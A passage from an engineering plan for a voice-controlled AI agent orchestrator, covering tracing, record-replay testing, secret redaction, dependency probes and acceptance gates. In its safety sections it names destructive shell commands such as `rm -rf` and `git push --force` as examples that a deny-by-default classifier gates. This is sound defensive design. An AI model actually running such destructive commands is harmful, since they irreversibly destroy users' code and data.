  fails); *listening-indicator test* — E2 active whenever the mic streams, inactive
  when muted; *persistence-guard test* — the audio buffer is never passed to any writer for the whole
  session (mock the writer, assert never-called; RBG: introduce a raw-audio write path → the guard
  test fails); *near-miss / first-run-VAD tests* (design §10.1).
- *E2e:* live — assert the consent line is spoken **first**, **states "Only transcripts are saved"**
  (AC1.1) and names "Curtain", the listening indicator is active for the **whole** session, and a
  **whole-session** post-run disk/log scan finds **zero** audio artifacts — including across muted
  intervals (RBG: introduce a `.wav`/`.pcm` write anywhere → the whole-session scan fails).
- *Third-party:* P-ASR, P-TTS.
- *Observability:* `session.start{provider, consentSpoken:true, transcriptOnlyStated:true}`, `listen.indicator{streaming:bool}`,
  `audio.persistence.guard{rawWritesObserved:0}` (periodic proof for the whole session),
  `onboarding.nearMiss{phrase, closest, distance}`.

---

## 13. Observability — REQ-16 (the observability contract)

`src/obs/`. **Observability is a first-class pipeline stage, not bolted on** (eng-oss §5.4).

- `trace.ts` — the **`TraceProcessor`**: every event flows through it and emits one structured
  `LogEvent` (§1.3, design §13.3) **before** going downstream, so nothing is silently lost. Verb-noun
  event names (`process.spawn`, `route.pass`, `safety.intercept`); stable ids (`sessionId`,
  `correlationId`, `upid`); **measured** `latencyMs`. **The trace log is the single source of truth**
  for causal-chain reconstruction.
- `otel.ts` — Smithers-side: instrument per-process agent calls (incl. the §8 safety hook events) with
  OpenTelemetry GenAI semantic conventions, export to self-hosted **Langfuse** via OTLP (ENG-D-07).
  Cue's JSONL covers the Cue side (eng-deps §7a); the two are joined by `correlationId`/`upid`.
- `board/` — the **read-only** React 19 board served over Hono SSE (design §9). Zero operational
  controls; the system never waits for board connections and never alters behavior based on board
  presence (off the critical path of every voice flow).

**Verify (observability):**
- *Unit/integration:* *trace-schema test* (every record carries required ids/fields; RBG: drop
  `correlationId` → fails); *causal-chain reconstruction test* (rebuild an utterance's full
  observation→decision→action→outcome chain — including a safety read-back→resolution — from recorded
  traces alone); *board read-only test* (no mutating endpoint/handler; RBG: add a POST route → fails);
  *trace-roundtrip test* (every event serializes/deserializes byte-identical, eng-oss §4.5).
- *E2e:* *board-non-authoritative test* — run the full REQ-5 scenario with the board server **down**
  and assert it still passes (AC16.2; RBG: make a voice flow await a board connection → board-down
  scenario hangs → proves the off-path guarantee is tested); then run with the board up and
  reconstruct the loop from persisted traces only, asserting it matches the live run.
- *Third-party:* P-CUE SSE routes (consumed read-only), P-OTEL (Smithers→Langfuse OTLP export).
- *Observability:* this section *is* the contract.

---

## 14. Runtime, build & engineering-only foundations

- **Bun** (runtime + `bun:test`) — already the project runtime; `bun test` is wired (recent commit).
  Native-module compat for the spotter is the one open question (P-BUN-NATIVE).
- **Hono** — HTTP/WebSocket for the seam dispatcher, the board server, and the emergency endpoint;
  Bun-native (eng-deps §8).
- **React 19** — the read-only board only (off critical path); **exempt** from validate-before-build
  as a popular framework, proven by the board e2e (AC16.2).

**Engineering-only tickets** (pure implementation infrastructure serving no single feature — called
out explicitly per the operating rules):

| Ticket | What | Serves |
|---|---|---|
| **ENG-T-01** | The shared `types.ts` data contract, defined first | All components (eng-oss §5.1) |
| **ENG-T-02** | The record-replay harness (`src/replay/harness.ts`) | The entire test strategy (§15.1) |
| **ENG-T-03** | The `TraceProcessor` plumbing as a pipeline stage | Cross-cuts REQ-16; infra for all |
| **ENG-T-04** | Provider-interface scaffolding + record-replay/noop test doubles | All providers (§2) |
| **ENG-T-05** | The probe suite (`poc/`) — validate-before-build harness | All P0 probes (§17) |
| **ENG-T-06** | Bun/Hono project scaffold + CI wiring (`bun test`, red-before-green gate) | Build/CI |
| **ENG-T-07** | The annotated replay corpus (`artifacts/smithering/corpus/replay/`) — JSONL + labels, labeling protocol, dev/test split, RBG harness (§15.5) | REQ-3 AC3.4 (the restraint metric) — R16 |
| **ENG-T-08** | The shell-command classifier + shell-parser integration (`safety/shell-classifier.ts`, §8.1.1) | REQ-11 AC11.1/AC11.2 (Safe stays autonomous) — R9 |
| **ENG-T-09** | The `SubscriptionCredentialProvider` + `TraceProcessor` redaction filter (§2.1, §15.6) | PRD §6 secrets constraint (no raw keys, nothing logged) — R15 |

---

## 15. Validation & observability — the centerpiece

### 15.1 Record-replay harness (the testable seam)

ASR + LLM are non-deterministic, so all decision tests run the decision LLM at **temperature-0** and
replay **pre-recorded ASR output as JSONL** (design §13.1; eng-oss §5.3 — confirmed by all four
references):

```
[real audio] → [ASR real, recorded once] → [transcript-observation JSONL]
                                                   ↓
[replay reads JSONL] → [decision loop, temp-0] → [actions / routing decisions]
```

Same input → same output every run (the audio-domain analog of snapshot testing). On AI-output
surfaces assert **shape/invariants** ("≤3 MCQs", "≤15 words", "fires within budget"), **never exact
text**.

### 15.2 The two-layer AND, and red-before-green

- **Unit/integration AND e2e for every behavior.** If we deleted either layer, the surviving layer
  alone must still leave us *fairly confident* the behavior holds. Every Verify block above names both.
- **Red-before-green is mandatory.** Each test is trusted only after it has been shown to fail. The
  standard moves: **remove the guard** (dispatch invariant, 15-word guard, mute stream-close, the
  safety hook); **breach the budget** (earcon ≤300 ms, round-trip <1 s, timeout ack); **cross the
  boundary** (59/61 words, 89/91 s, distance-≤2 collision). The red run is the evidence.

### 15.3 The 10×–100× catalog (boundary / fuzz / benchmark)

The Verify blocks are the **floor**. Each component additionally carries: **empty/longest inputs**
(empty transcript, single word, 10k-word monologue → all `observe.pass`); **silence** (no
observations, not empty ones); **simultaneous speakers** (2 at once — routing/diarization stay sane);
**mis-transcription** (garbled callsign/confirm → re-prompt or drop, never destructive execution);
**fuzz** (random confirm tokens, double-confirm, "confirm" to the wrong gateId/process, unknown tool
classes at the safety hook); and **benchmarks** for performance-critical paths (earcon <300 ms;
round-trip p50<1 s / p95<1.5 s; timeout-ack fires at the budget edge) recorded as **regression
baselines that fail on regression** (REQ-10 e2e). Anything unverified is treated as broken.

### 15.4 Structured observability contract

Every event emits one `LogEvent` (§1.3): `level` · `event` (verb-noun) · `sessionId` · `correlationId`
(one loop iteration) · `upid` · `latencyMs` (**measured, not estimated**) · `meta`. A debugging agent
with **no context** must be able to query one `correlationId` and replay the full
observation→decision→action→outcome chain (REQ-16 AC16.3), including a safety read-back→resolution.
Cue JSONL (Cue side) + OTel/Langfuse (Smithers side), joined by `correlationId`/`upid`.

### 15.5 The annotated replay corpus — a concrete, owned, versioned artifact (R16) — REQ-3 AC3.4

AC3.4's recall (**≥80%**) and false-positive (**≤1/10 min**) bar — the single most important restraint
metric — is only reproducible if the corpus it runs against is a *real, fixed, owned artifact*, not a
hand-wave. The prior draft referenced "the annotated replay suite" without defining it (R16). It is
now engineered as ticket **ENG-T-07** (`replay-corpus-contract.html`, ENG-A-14):

- **Location & form.** `artifacts/smithering/corpus/replay/` — versioned with the repo. It stores
  **transcript-observation JSONL** (the recorded Deepgram output, §15.1) + a `labels.json` ground
  truth, **not raw audio in the product runtime** (NG-6). Any seed `.wav` used to *generate* the JSONL
  once lives only in a **dev-only corpus store fenced outside the product** (the product's
  whole-session persistence guard, §12, still proves zero raw-audio at runtime). A `CORPUS.md` records
  provenance and a CHANGELOG.
- **Minimum size (for statistical power).** **≥60 min** of "should-pass" (negative) audio — enough to
  observe a ≤1/10-min FP rate meaningfully (≥6 ten-minute windows) — and **≥50** distinct ground-truth
  "should-suggest" segments. Both grow over time; these are floors.
- **Label schema.** Each segment: `{segmentId, startMs, endMs, label: 'should-suggest'|'should-pass',
  topic, rationale, speakerCount, conditions: ['clean'|'overlap'|'noise'|'near-homophone']}`.
- **Labeling protocol.** **≥2 independent human labelers**; disagreements adjudicated by a third;
  **inter-annotator agreement recorded** (Cohen's κ, target ≥0.7) so the ground truth itself is
  trustworthy. Protocol documented in `CORPUS.md`.
- **Representative negatives.** The "should-pass" set **must** include technical jargon, build/test
  talk, two-speaker overlap, silence, and **near-homophones of every always-hot word** (callsigns,
  "Panop", "Curtain", "Daybreak", "Abort") — the exact inputs that cause false triggers.
- **Train/test separation (no overfitting the gate).** The corpus is **test-only**. Suggestion-engine
  knobs/thresholds are tuned on a **separate dev split**; the **held-out test split** is run **only**
  for the AC3.4 acceptance number and is never used for tuning. A *leakage test* asserts the two splits
  are disjoint by `segmentId`.
- **Red-before-green evidence.** The recorded RBG move: **shuffle the ground-truth labels** → recall
  and FP collapse → the suite **fails**, proving it actually discriminates (not just passes a trivially
  satisfiable assertion). The red run is archived under `artifacts/smithering/reports/` alongside the
  green run.
- **Ownership.** Owned by the engineering team; the corpus version + the measured (recall, FP) pair are
  recorded per acceptance run so the metric is reproducible and regressions are visible.

### 15.6 Secret hygiene — no raw keys, redaction proven by test (R15)

Per §2.1 and PRD §6: provider credentials come **only** from the Smithers subscription layer, are
**never** written to source/env-in-repo/artifact/log/JSONL/probe report, and the `TraceProcessor`
**redaction filter** strips any credential-shaped value before emission (fail-closed). This is proven,
not asserted: the *secret-redaction test* (§2.1), the *subscription-path test* (§2.1), each probe's
redaction assertion (§17), and a *whole-session secret-scan* (greps the entire trace/log/report tree
for key-shaped strings, asserts zero). RBG: plant a fake key in a `meta` field with the filter
disabled → it leaks → test fails; enable → `«redacted»`.

---

## 16. Dependencies (declared) — purpose + risk

Every infra/3rd-party dependency. Each maps to ≥1 probe in §17. (Detail: eng-deps §1–§8.)

| # | Dependency | Purpose | Risk | Probe |
|---|---|---|---|---|
| 1 | **Cue** (`github.com/jameslbarnes/cue`) | Canonical audio-observation substrate: transcription→observations→cue policies→act-or-`observe.pass`; two-Program routing; `TextCue` recognition; `MappedActionTool`; JSONL traces (D2) | **HIGH / P0 BLOCKER.** Repo availability **unconfirmed** (domain.md §7 vs prior-art.md §1); entire input/routing/suggestion layer (REQ-1/3/5/6/7) depends on it; the hot-plane earcon depends on `TextCue` latency. Mitigation: thin owned adapter; gaps recorded as risks | **P-CUE** |
| 2 | **Smithers** (`smithers-orchestrator ^0.23.0`) | Durable agent process manager: spawn, `streamRunEvents`, pause/resume, steer/signal, recovery, concurrent runs; **PreToolUse hook + approval gate** for the safety boundary (§8); all model calls via subscriptions (no raw keys) | **HIGH** (single-vendor, mitigated by first-party status). Fork/resume/steer semantics **and the pre-tool hook / approval-gate primitive** vs our model are unconfirmed | **P-SMITHERS**, **P-HOOK** |
| 3 | **Deepgram Nova-3** (streaming ASR) | Primary transcription provider behind `ASRProvider`: streaming, `isFinal`, diarization labels | **MEDIUM** (interface-abstracted, swappable). Diarization-label stability is the tightest coupling (`SpeakerChangedCue`); latency must hit <200 ms word-final | **P-ASR** |
| 4 | **TTS provider** (ElevenLabs Flash v3 / Cartesia Sonic / PlayHT 3.0 Turbo) | Streaming text→audio for acks/summaries/read-backs behind `TTSProvider` | **LOW-but-UNVERIFIED.** Research benchmarked ASR, **not** TTS; first-byte ≤200 ms unproven; probe is also the selection benchmark | **P-TTS** |
| 5 | **Cheap/fast decision LLM** (Claude Haiku-4.5 via Smithers subscription; Cerebras Llama contingent) | Hot-loop decisions: suggestion scoring, 15-word summarizer, tool-selection. **Routed through Smithers subscriptions — no raw API key** (PRD §6, R15). **No Opus/Sonnet** (NG-9) | **MEDIUM** (R15). Must reach the model **through the subscription path** (Cerebras only if subscription-routable or PRD amends §6); temp-0 determinism + ~100 ms p50 must hold; **no key may be logged** | **P-LLM** (+ A-LLM-SUB) |
| 6 | **On-device keyword spotter** (Picovoice Porcupine / OpenWakeWord) | Local "Daybreak" unmute spotter while cloud is muted; emits only `mute.released` — **the sole operational unmute path (R10)** | **MEDIUM (raised, R10).** Now **on the critical path for REQ-2/D1** (voice-unmute); a failed probe is no longer a soft fallback — spotter-down means session-end+restart, not in-session unmute. Custom-keyword accuracy on team-room speech unverified | **P-SPOTTER (blocking)**, **P-BUN-NATIVE** |
| 7 | **Langfuse + OpenTelemetry** (Smithers-side observability) | OTLP-native LLM tracing for per-process agent calls incl. safety hook events | **LOW** (OTLP standard, backend swappable; off critical path) | **P-OTEL** |
| 8 | **Phonetic-distance library** (double-metaphone + phoneme-Levenshtein) | Callsign collision guard (D-DD-05) | **LOW** (pure, deterministic, unit-testable; swappable) | **P-PHONETIC** |
| 9 | **Bun** (runtime + test runner) | TS execution, `bun:test`, fast install | **MEDIUM** (native-module compat for the spotter unverified; pure-TS path already confirmed by `bun test`) | **P-BUN-NATIVE** |
| 10 | **Hono** (HTTP/WebSocket) | Seam dispatcher, board server, emergency endpoint | **LOW** (standard HTTP, Bun-native; covered by P-SEAM/board e2e) | **P-SEAM** (dispatcher), board e2e |
| 11 | **React 19** (read-only board) | Optional debug board UI (off critical path) | **LOW.** **Exempt** from validate-before-build (popular framework); proven by board-non-authoritative e2e | board e2e (exempt) |
| 12 | **Shell-command parser** (`shell-quote` or equiv.) | Tokenize/split shell commands into simple-commands + operators for the §8.1.1 safety classifier (R9) | **MEDIUM.** A parser miss = a destructive command mis-classified `read-safe`; mitigated by deny-by-default (unparseable → `unknown`→gated) + heavy fuzz tests | **P-SHELL-PARSE** |
| 13 | **Smithers subscription credential layer** (`SubscriptionCredentialProvider`) | The one credential path for ASR/TTS/LLM; enforces "no raw API key" (PRD §6, R15) | **MEDIUM.** Whether the hot-loop model is reachable through subscriptions is unproven (A-LLM-SUB); a leak would breach PRD §6 — mitigated by the redaction filter + secret-scan tests (§15.6) | **P-LLM** (subscription assertion), redaction tests |

---

## 17. Assumptions to probe (validate-before-build gates)

Per the validation bar, **every non-framework third-party dependency is exercised against the real
API with a probe that asserts the exact behavior we rely on, before any product code is built on it**
(a probe that *could* fail and *passed* is the evidence — docs/memory are not). React/standard
libraries are exempt. **Every dependency in §16 maps to ≥1 probe below; all are blocking unless a
justification is given.** Probe scripts live under `poc/`; results under `artifacts/smithering/reports/`.
**Round-1 assumption probes have now RUN (2026-06-14) — see §22 for results and the required plan
amendments. The pipeline is PAUSED on a blocking-probe failure pending human approval of the amended
plan.** The remaining P-* gates below stay UNRUN.

| Probe | Dependency | The one narrow question | Blocking? |
|---|---|---|---|
| **P-CUE** (P0) | Cue | Can we run the *real* Cue library, and does its cue-policy + `observe.pass` + two-`Program` routing + `MappedActionTool` schema + provider slots match our design **and does a `TextCue` decision resolve within the ≤300 ms earcon budget** (recognition stays on Cue, §3.4)? | **YES** — if false, REQ-1/3/5/6/7 are redesigned. **First build task.** |
| **P-HOOK** (P0) | Smithers pre-tool hook | Can a PreToolUse hook in a real Smithers run **intercept and hold a destructive tool call *before* execution**, and can approve/deny/timeout resolve the held call (file unmodified on deny/timeout)? | **YES** — REQ-11 (the critical R1 finding) is unenforceable without this; the safety guarantee is a lie until it passes. |
| **P-ASR** (P0) | Deepgram Nova-3 | Does Nova-3 streaming deliver `isFinal`-flagged, diarized observations with word-final latency <200 ms and **no** observation on silence — **with its credential drawn from the subscription layer and never logged** (R15)? | **YES** — the ≤300 ms earcon and <1 s round-trip (REQ-10) depend on it. |
| **P-TTS** (P0) | TTS provider | Which candidate streams **first audio byte ≤200 ms** of text submission (and does any) — **with no key written to any log/report** (R15)? | **YES** — round-trip ≤1 s (REQ-10) is unprovable until one passes; the probe also *selects* the provider. |
| **P-LLM** (P0) | Decision LLM | Does the chosen cheap/fast model — **reached through the Smithers subscription path, with no raw API key (R15)** — return **temperature-0-deterministic** decisions within ~100 ms with a `MappedActionTool`-compatible tool-selection schema, **and does the probe's own trace contain zero key-shaped strings**? | **YES** — record-replay (§15.1), the hot-loop budget, **and PRD §6 (subscriptions, no raw keys)** depend on it. |
| **A-LLM-SUB** (P0) | Subscription credential layer | **Can the cheap/fast hot-loop model actually be reached *through Smithers subscriptions*** (vs. requiring a raw provider key)? If Haiku-4.5-via-subscription, confirm; if only Cerebras meets latency and it is **not** subscription-routable, this is a blocking conflict with PRD §6 to surface, not work around. | **YES** — PRD §6 is binding; if no compliant hot-loop model exists, the constraint or the model choice must change at the gate. |
| **P-SHELL-PARSE** (P0) | Shell-command parser | Does the parser split compound commands (`&&`/`;`/`\|`), expose redirections, and surface command-substitution/`eval`/process-substitution as distinct tokens so the §8.1.1 classifier can gate them (unparseable → `unknown`)? | **YES** — the safety classifier (R9, critical) is only sound if parsing is; a mis-parse mis-classifies a destructive command as `read-safe`. |
| **P-SMITHERS** (P0) | Smithers | Against the *real* harness, do durable spawn, `streamRunEvents`, pause/resume, steer/signal, restart-recovery, and concurrent runs behave as our lifecycle assumes — and how is fork realized (native vs fresh-seeded-run + `parentId`)? | **YES** — REQ-4/8/13/15 depend on it. |
| **P-SEAM** (P0) | Cue↔Smithers seam (+ Hono) | Does a Cue `MappedActionTool` action round-trip through the dispatcher into a real Smithers run **and** do Smithers SSE run-events (incl. the §8 approval-request) flow back into Cue as observations, with spawn ≤3 s and **without blocking the Cue loop**? | **YES** — the novel integration; top integration risk (PRD §9). |
| **P-SPOTTER** (P0) | Keyword spotter | Does the local spotter detect "Daybreak" with acceptable recall and <1 FP/hr on team-room speech while emitting **only** `mute.released` and no transcript? | **YES (raised to blocking, R10)** — voice-unmute via the spotter is **the sole operational unmute** (REQ-2/D1); there is **no** in-session non-voice unmute. A failed probe means the only spotter-down recovery is REQ-14 kill-all + session restart, so the spotter's reliability must be proven before voice-unmute ships, not assumed. |
| **P-BUN-NATIVE** | Bun native compat | Does the native spotter module (Porcupine/ONNX) load and run under Bun's Node-compat layer? | **NO** — *justified:* even though voice-unmute is now critical (R10), this probe gates only the *Bun-specific* load path; the spotter is an isolated single-purpose component that can run as a **separate Node sidecar** if Bun native compat fails, with no architectural change. The rest of the stack is pure TS on Bun (confirmed by `bun test`). |
| **P-PHONETIC** | Phonetic-distance lib | Does the double-metaphone / phoneme-Levenshtein library produce **stable, reproducible** codes so the callsign collision guard is deterministic? | **NO** — *justified:* a pure, offline, deterministic library fully covered by unit tests; if it misbehaves we swap it with zero architectural impact. |
| **P-OTEL** | Langfuse / OTel | Does Smithers' structured output export cleanly to a self-hosted Langfuse via OTLP with GenAI semantic conventions? | **NO** — *justified:* observability is off every critical path (REQ-16 AC16.2) and Cue JSONL already covers causal-chain reconstruction; OTLP backends are swappable by config. |

> **⚠ P0 BLOCKER (carried from PRD §6 / design §15 / eng-deps §1).** Upstream artifacts **disagree on
> whether the Cue repo is publicly accessible** (`domain.md` §7 unconfirmed 2026-06-13; `prior-art.md`
> §1 documents the API as found). **Confirming Cue repo access and running P-CUE is the first build
> task and a hard gate.** Every Cue claim here is README-derived and unconfirmed. *(Surfaced to the
> orchestrator's gate via the structured output — not raised as a human request from this pass.)*

> **⚠ NEW P0 PROBE (R1).** **P-HOOK** must pass before REQ-11 is trusted: if Smithers cannot
> intercept-and-hold a tool call before execution, the entire read-back/confirm safety guarantee is
> not enforceable and the design (and possibly the PRD's optimistic-execution posture) must be
> revisited. Surfaced to the gate.

> **⚠ NEW P0 PROBES / GATE ITEMS (second round, R9/R10/R15).** **P-SHELL-PARSE** gates the §8.1.1
> shell classifier that keeps Safe mode autonomous (R9, critical). **P-SPOTTER is now blocking**
> because voice-unmute is the sole operational unmute (R10). **A-LLM-SUB** must confirm a
> PRD-§6-compliant (subscription-routed, no-raw-key) hot-loop model exists; if the only model meeting
> the ~100 ms budget cannot be reached through Smithers subscriptions, that is a **binding conflict
> with PRD §6** to resolve at the gate, not engineer around (R15). Surfaced to the gate via the
> structured output.

---

## 18. Requirements traceability

Every PRD requirement maps to the engineering section(s) that implement it. Conversely, every
engineering section serves a requirement; pure-infrastructure work that serves no single feature is
the **engineering-only tickets** (ENG-T-01..09, §14), called out explicitly.

| PRD Requirement | Engineering section(s) |
|---|---|
| REQ-1 — Ambient listening, consent, transcript-only | §2 (ASR), §3 (Cue/adapter), §5 (mute), **§12 (consent scheduler — incl. "Only transcripts are saved" AC1.1/R12, listening indicator, whole-session persistence guard)**, §13 (trace) |
| REQ-2 — Hard spoken mute | §5 (mute-controller — **mute = earcon + one-word "Muted" TTS, AC2.4/R13**), **§5.3.1 (voice-unmute is the sole operational unmute, R10)**, §2 (ASR stream stop) |
| REQ-3 — Conservative suggestion engine | §6 (suggestion engine), §3 (Cue policies), **§15.5 (the annotated replay corpus contract — AC3.4/R16)** |
| REQ-4 — Hands-free spawn → durable process | **§7 (acceptance→spawn flow: pending state, MCQ accumulation, accept/decline classifier, auto-select, planning)**, §9 (seam), §10 (registry) |
| REQ-5 — Canonical voice loop (the spine) | §1 (planes), §3, §4, §7, §9, §10 (spine) |
| REQ-6 — Two-channel routing + acks | §4 (dispatch invariants, **AC6.4 acks implemented as written §4.2/R14 — four distinct Layer-B acks incl. ambient pass**), §3 (two Programs), §5 (routing/latency acks) |
| REQ-7 — Fixed magic-word vocabulary | §4 (vocabulary, callsigns, **handlers — incl. status, pause-all, and per-process pause/resume §4.3/R11**), §8.3 (mode commands) |
| REQ-8 — Voice steering of a selected process | §4 (steering window), §9 (steer/signal), §10 (isolation) |
| REQ-9 — Rationed spoken output | §5 (output policy, earcons — **all spoken read-backs ≤15 words, AC9.3/R13**) |
| REQ-10 — Sub-second ack latency | §1 (three planes), §3.4 (hot-plane recognition on Cue), §5 (earcons, **timeout "working" ack §5.4**), §2 (ASR/TTS latency) |
| REQ-11 — Safe-by-default execution | **§8 (in-run PreToolUse safety hook + safe-executor, dead-man timer, Safe/Explicit/Dangerous modes)**, **§8.1.1 (shell-command classifier keeping Safe autonomous, AC11.1/R9)**, §9 (approval round-trip) |
| REQ-12 — Panic/stop word | §4 (priority ladder), §5 (**halt = earcon + ≤15-word TTS, AC12.3/R13**), §10 (halt) |
| REQ-13 — Minimal concurrent fleet | §10 (registry/fleet — **per-process pause/resume drives "steer A, pause B" §10/R11**), §4.3 (per-process pause/resume commands), §9 (concurrent runs) |
| REQ-14 — Non-voice emergency stop | §11 (emergency stop — **kill-all + session-end only, NOT an unmute, AC14.2/R10**) |
| REQ-15 — Durable processes | §10 (lifecycle, **pre-spawn resource check §10.1**), §9 (Smithers durability) |
| REQ-16 — Observability surface + tracing | §13 (trace, OTel, board), **§15.6 (secret-redaction in the trace contract, R15)** |
| *(cross-cutting infra serving PRD §6 secrets constraint)* | **§2.1 (subscription-mediated credentials, no raw keys), §15.6 (redaction) — R15** |
| *(engineering-only)* | ENG-T-01 types · ENG-T-02 replay harness · ENG-T-03 trace plumbing · ENG-T-04 provider scaffolding · ENG-T-05 probe suite · ENG-T-06 Bun/Hono/CI scaffold · **ENG-T-07 annotated replay corpus (§15.5)** · **ENG-T-08 shell-classifier + shell-parser integration (§8.1.1)** · **ENG-T-09 credential layer + redaction filter (§2.1/§15.6)** (§14) |

---

## 19. Engineering verification — the build-acceptance gate

Engineering V0 is accepted **only if** all of the following hold. This is the engineering restatement
of the PRD's §8 user-visible gate; each line is proven by the tests named above, each capable of
failing (red-before-green recorded).

1. **EV-1 — Probes green first.** Every **blocking** probe (P-CUE, **P-HOOK**, P-ASR, P-TTS, P-LLM,
   P-SMITHERS, P-SEAM) has a recorded red-before-green pass against the **real** API before any code
   depends on it. **P-CUE is the first build task** (the P0 blocker); **P-HOOK gates REQ-11**;
   **P-SPOTTER (R10), P-SHELL-PARSE (R9) and A-LLM-SUB (R15) are now blocking too**. Non-blocking
   probes (P-BUN-NATIVE, P-PHONETIC, P-OTEL) run before their paths ship.
2. **EV-2 — The contract, harness & credential path exist (ENG-T-01/02/04/09).** `types.ts`, the
   record-replay harness, and the injectable provider doubles are in place; the inner test loop runs
   **headless, no mic, no network, no API keys**; provider credentials resolve **only** through the
   `SubscriptionCredentialProvider` (§2.1) and the redaction filter is active (§15.6).
3. **EV-3 — Every component carries both layers.** Unit/integration AND e2e for each of §2–§14, with
   the named red-before-green failure injection demonstrated.
4. **EV-4 — The spine passes ≥9/10 with zero GUI/keyboard events** (§10 canonical scenario + no-screen
   harness), each failure attributable to a logged cause.
5. **EV-5 — Latency baselines recorded** (§5/§15.3): earcon <300 ms; round-trip p50<1 s / p95<1.5 s
   over ≥100 live round-trips; the **timeout "working" ack** fires at the budget edge — all stored as
   regression baselines that **fail on regression**.
6. **EV-6 — Restraint proven on a real corpus** (§5/§6/§15.5): ≥90% silent ticks; ≤1 false-positive/10
   min and ≥80% recall on the **held-out split of the engineered annotated corpus** (ENG-T-07, R16),
   with the shuffle-labels RBG run archived; **AC6.4 honored — all four Layer-B acks (suggestion,
   steer, addressed-pass, ambient-pass) are distinct** (§4.2, R14).
7. **EV-7 — Safety proven at the execution boundary, Safe stays autonomous** (§8/§8.1.1/§11): a
   destructive **tool call** is held before execution and blocks on "confirm"; the in-hook dead-man
   timer aborts (file unmodified); **a Safe-mode run executes `bun test`/`git status`/`grep` with zero
   approvals while `rm -rf`/`git push --force`/unknown/compound/redirect/injection shell is gated**
   (R9, AC11.1); explicit/dangerous modes behave and reset; panic halts ≤1 s; non-voice emergency
   kills all ≤2 s **(kill-all + session-end, not an unmute — R10)** — all with red-before-green and
   **P-HOOK** + **P-SHELL-PARSE** green.
8. **EV-8 — Spawn flow proven** (§7/§10): a spoken accept spawns **exactly one** auto-selected
   PLANNING process seeded with pitch + MCQ answers; decline/ignore is a **no-op**; a spawn at
   capacity is **refused with an audible ack** and leaves the registry unchanged.
9. **EV-9 — Durability & fleet** (§9/§10): kill-backend-mid-run resumes from checkpoint; two processes
   steer/pause independently; with the fleet disabled the spine still passes.
10. **EV-10 — Consent & debuggability** (§12/§13): consent spoken within 3 s, listening indicator
    active whole-session, **whole-session** disk/log scan finds zero raw audio; any utterance's full
    chain (incl. safety read-back→resolution) is reconstructable from persisted traces; the board is
    non-authoritative.
11. **EV-11 — The 10×–100× catalog is populated** (§15.3): boundary/fuzz/benchmark cases beyond the
    Verify-block floor exist for every component, every test demonstrated capable of failing.
12. **EV-12 — PRD-literal acceptance criteria pass as written** (R12/R13/R14): consent states "Only
    transcripts are saved" (AC1.1); mute = earcon + one-word TTS (AC2.4); halt = earcon + ≤15-word TTS
    (AC12.3); every spoken read-back ≤15 words (AC9.3); AC6.4's distinct pass-ack present. No literal AC
    is knowingly violated; any preferred deviation (ambient-pass silence) is gated behind a recorded
    PRD amendment, not shipped unilaterally.
13. **EV-13 — Secret hygiene proven** (§2.1/§15.6, R15): the subscription-path test, the
    secret-redaction test, every probe's redaction assertion, and the whole-session secret-scan are
    green; **no raw key appears anywhere** in source/artifact/log/trace/report, with RBG recorded.

---

## 20. Decisions log & HTML decision-doc index

| ID | Decision | Rationale |
|---|---|---|
| **ENG-A-01** | Three concurrency planes (Hot ≤300 ms / Decision ~100 ms / Durable seconds), communicating only via queues | Latency asymmetry (REQ-10 vs REQ-4) forbids sharing an await-chain across planes. (`concurrency-planes.html`) |
| **ENG-A-02** | The provider interface is the universal test boundary; record-replay is the test spine | All four OSS references converge (eng-oss §5.2/§5.3); makes the 10×–100× bar achievable headless. (`provider-test-boundary.html`) |
| **ENG-A-03** | The Cue↔Smithers seam is one explicit, owned, async, bidirectional module carrying the safety approval round-trip | Novel integration, top risk (PRD §9); one home to probe/trace/test. (`cue-smithers-seam.html`) |
| **ENG-A-04** | All routing/safety **authority** lives in deterministic code; the LLM scores quality/intent only | Keeps REQ-6/7/11/12 testable over a non-deterministic core. (`invariants-in-code.html`) |
| **ENG-A-05** | `types.ts` shared contract defined first (ENG-T-01) | Single source for the data contract (eng-oss §5.1/§7). |
| **ENG-A-06** | Every dependency maps to ≥1 probe; blocking unless justified; P-CUE first, P-HOOK gates REQ-11 | Validation bar — all 3rd-party integrations proven in isolation before build (§17). (`probe-gating.html`) |
| **ENG-A-07** | Adopt eng-deps decisions ENG-D-01..09 | The dependency research is sound and consistent with PRD/design. |
| **ENG-A-08** | **Safety gate lives in an in-run PreToolUse hook + safe-executor at the agent's tool-call boundary, classified deny-by-default, probe-gated by P-HOOK** | **R1 (critical).** A dispatcher-side NL-verb classifier cannot guarantee it sees a destructive action before execution and misses agent-initiated ops; the only enforceable place is the real tool-call site inside the run. (`safety-execution-boundary.html`) |
| **ENG-A-09** | **The hot-plane earcon is triggered by Cue's deterministic `TextCue` decision (recognition stays on Cue); fallback adapter pre-matcher mirrors the `TextCue` config only to drive the earcon, never as authority** | **R4.** Resolves the latency-vs-Cue-substrate contradiction by splitting Cue's deterministic policy eval (fast) from its LLM-scored decision (slow). (`hot-plane-cue-recognition.html`) |
| **ENG-A-10** | **AC6.4 implemented as written: four distinct Layer-B acks (suggestion / steer / addressed-pass / ambient-pass); ambient-pass silence is a knob unlocked only by an explicit PRD amendment** | **R6/R14.** The doc may not knowingly violate a literal AC; default honors AC6.4, while the product-preferred restraint (silence) has a clean, single-flag path iff the PRD amends. (`addressed-pass-ack.html`) |
| **ENG-A-11** | **Execution modes Safe (default) / Explicit (per-step) / Dangerous (gate off); non-defaults voice opt-in, session-only, warned + off by default** | **R7.** AC11.4 requires both dangerous and fully-explicit modes; both reachable only by warned, state-gated voice commands. (`execution-modes.html`) |
| **ENG-A-12** | **Deterministic shell-command classifier (parse → per-simple-command verdict → most-dangerous compound verdict; read-safe ungated, mutating/unknown/redirect/injection gated, deny-by-default)** | **R9 (critical).** A blanket `shell` gate turns Safe into Explicit (violates AC11.1); a defined parse-based policy keeps harmless shell autonomous while gating destructive/unknown shell. (`shell-classifier-policy.html`) |
| **ENG-A-13** | **Voice-unmute via the local spotter is the sole operational unmute (P-SPOTTER blocking); REQ-14 emergency control is kill-all + session-end only — never an in-session unmute; spotter-down recovery = restart unmuted** | **R10.** Reusing the emergency kill-all as an unmute violates AC14.2 and D1's voice-only model; a session-teardown+restart is the compliant spotter-down recovery. (`unmute-recovery.html`) |
| **ENG-A-14** | **The annotated replay corpus is a concrete, versioned, owned artifact: location, ≥60 min negatives + ≥50 positives, label schema, ≥2-labeler protocol with κ, dev/test split, shuffle-labels RBG** | **R16.** AC3.4 (the restraint metric) is reproducible only against a fixed, leakage-free, human-labeled corpus, not a vague "suite." (`replay-corpus-contract.html`) |
